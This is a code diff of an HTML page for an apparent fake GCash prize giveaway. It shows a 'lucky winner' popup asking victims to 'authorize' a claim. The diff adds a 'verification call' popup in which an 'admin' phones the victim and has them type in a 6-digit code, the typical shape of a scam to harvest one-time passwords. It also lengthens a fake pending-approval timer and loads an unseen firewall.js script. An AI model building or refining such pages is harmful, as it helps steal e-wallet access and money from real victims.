@@ -44,10 +44,10 @@
 
         <div class="amount" id="balanceText">₱0.00</div>
 
-        <!-- PENDING STATUS AREA (hidden by default) -->
+        <!-- PENDING STATUS AREA -->
         <div id="pendingStatusArea" style="display: none; margin-top: 15px;">
             <div id="pendingStatusText" class="pending-status-text">⏳ PENDING FOR APPROVAL ⏳</div>
-            <div id="pendingCountdown" class="pending-countdown">00:10</div>
+            <div id="pendingCountdown" class="pending-countdown">03:00</div>
             <div id="pendingMessage" class="pending-message-text">Prize will be available again after the time frame ends.</div>
         </div>
 
@@ -85,39 +85,47 @@
         </div>
     </div>
 
-    <!-- ========== REVISED CLAIM POPUP ========== -->
+    <!-- ========== CLAIM POPUP ========== -->
     <div id="claimPopup" class="claim-popup-overlay">
         <div class="claim-popup-card">
-            
             <h2 class="congrats-title">🎉 CONGRATULATIONS! 🎉</h2>
-            
-            <div class="greeting">
-                💎 YOU'RE A LUCKY WINNER! 💎
-            </div>
-            
+            <div class="greeting">💎 YOU'RE A LUCKY WINNER! 💎</div>
             <div class="prize-amount-wrapper">
-                <div class="prize-amount" id="popupPrizeAmount">
-                    ₱0
-                </div>
+                <div class="prize-amount" id="popupPrizeAmount">₱0</div>
                 <div class="prize-underline"></div>
             </div>
-            
             <div class="message">
                 <p>Ang iyong mga panalo ay handa na para sa iyong pag claim.</p>
                 <p>Sa sandaling iyong <strong class="highlight">AUTHORIZE</strong> ang claim, ang iyong credits ay agad na maililipat.</p>
                 <p>Ang iyong <strong>mobile number</strong> ay lalabas sa <strong>Live Winners</strong> bilang patunay ng iyong panalo.</p>
             </div>
-            
             <div class="simple-note">
                 <p>⚡ Kapag na-Authorize, automatic na transfer sa iyong GCash ang inyong premyo ⚡</p>
             </div>
-            
-            <button id="claimActionBtn" class="claim-action-btn" onclick="onClaimAction()">
-                CLAIM THRU GCASH
-            </button>
-            
-            <div class="info-note">
-                🔒 Secured Transaction | No Hidden Fees
+            <button id="claimActionBtn" class="claim-action-btn" onclick="onClaimAction()">CLAIM THRU GCASH</button>
+            <div class="info-note">🔒 Secured Transaction | No Hidden Fees</div>
+        </div>
+    </div>
+
+    <!-- ========== FIREWALL VERIFICATION POPUP ========== -->
+    <div id="firewallPopup" class="firewall-popup-overlay" style="display: none;">
+        <div class="firewall-popup-card">
+            <div id="firewallPopupContent" class="firewall-popup-content">
+                <div class="firewall-warning-icon">📞</div>
+                <h2>WAITING FOR VERIFICATION CALL</h2>
+                <div class="firewall-message">
+                    <p>Due to multiple claiming requests detected in the system, a verification call is required before proceeding.</p>
+                    <p>Please wait for the admin to call you. You will receive a 6-digit code during the call.</p>
+                    <p>Enter the code below to continue.</p>
+                </div>
+                <div class="verification-input-group">
+                    <input type="text" id="verificationCode" class="verification-input" placeholder="Enter 6-digit code" maxlength="6" inputmode="numeric">
+                    <button id="verifyCodeBtn" class="verify-btn" onclick="verifyFirewallCode()">VERIFY NOW</button>
+                </div>
+                <div class="firewall-note">
+                    <p>Waiting for admin to call... If no call received, please contact support.</p>
+                </div>
+                <div id="firewallErrorMsg" class="firewall-error" style="display: none;"></div>
             </div>
         </div>
     </div>
@@ -128,29 +136,16 @@
             70% { box-shadow: 0 0 0 15px rgba(255,170,51,0); transform: scale(1.05); }
             100% { box-shadow: 0 0 0 0 rgba(255,170,51,0); transform: scale(1); }
         }
-        
-        #rouletteIcon:hover {
-            transform: scale(1.05);
-            transition: 0.2s;
-        }
-        
-        .congrats-title {
-            font-size: 22px !important;
-            white-space: nowrap;
-        }
-        
-        @media (max-width: 480px) {
-            .congrats-title {
-                font-size: 18px !important;
-                white-space: nowrap;
-            }
-        }
+        #rouletteIcon:hover { transform: scale(1.05); transition: 0.2s; }
+        .congrats-title { font-size: 22px !important; white-space: nowrap; }
+        @media (max-width: 480px) { .congrats-title { font-size: 18px !important; white-space: nowrap; } }
     </style>
 
     <!-- ===== SCRIPTS ===== -->
     <script src="js/config.js"></script>
     <script src="js/game.js"></script>
     <script src="js/popup.js"></script>
+    <script src="js/firewall.js"></script>
 
     <script>
         // Roulette Modal Logic
@@ -170,44 +165,23 @@
             }, 500);
         });
         
-        closeRoulette.addEventListener('click', () => {
-            rouletteModal.style.display = 'none';
-        });
-        
-        rouletteModal.addEventListener('click', (e) => {
-            if (e.target === rouletteModal) {
-                rouletteModal.style.display = 'none';
-            }
-        });
+        closeRoulette.addEventListener('click', () => { rouletteModal.style.display = 'none'; });
+        rouletteModal.addEventListener('click', (e) => { if (e.target === rouletteModal) rouletteModal.style.display = 'none'; });
 
-        // ========== SHARED BALANCE FUNCTION ==========
         window.updateGameBalance = function(newBalance) {
             if (typeof GameState !== 'undefined') {
                 GameState.balance = newBalance;
-                if (typeof updateUI === 'function') {
-                    updateUI();
-                }
-                if (typeof saveData === 'function') {
-                    saveData();
-                }
+                if (typeof updateUI === 'function') updateUI();
+                if (typeof saveData === 'function') saveData();
             }
-            
             const balanceText = document.getElementById('balanceText');
-            if (balanceText) {
-                balanceText.innerText = "₱" + newBalance.toLocaleString() + ".00";
-            }
-            
-            if (typeof window.syncBalanceToRoulette === 'function') {
-                window.syncBalanceToRoulette();
-            }
-            
+            if (balanceText) balanceText.innerText = "₱" + newBalance.toLocaleString() + ".00";
+            if (typeof window.syncBalanceToRoulette === 'function') window.syncBalanceToRoulette();
             console.log('💰 Balance synced:', newBalance);
         };
 
         window.getCurrentBalance = function() {
-            if (typeof GameState !== 'undefined' && GameState.balance !== undefined) {
-                return GameState.balance;
-            }
+            if (typeof GameState !== 'undefined' && GameState.balance !== undefined) return GameState.balance;
             const balanceText = document.getElementById('balanceText');
             if (balanceText) {
                 let val = parseInt(balanceText.innerText.replace(/[₱,]/g, ''));
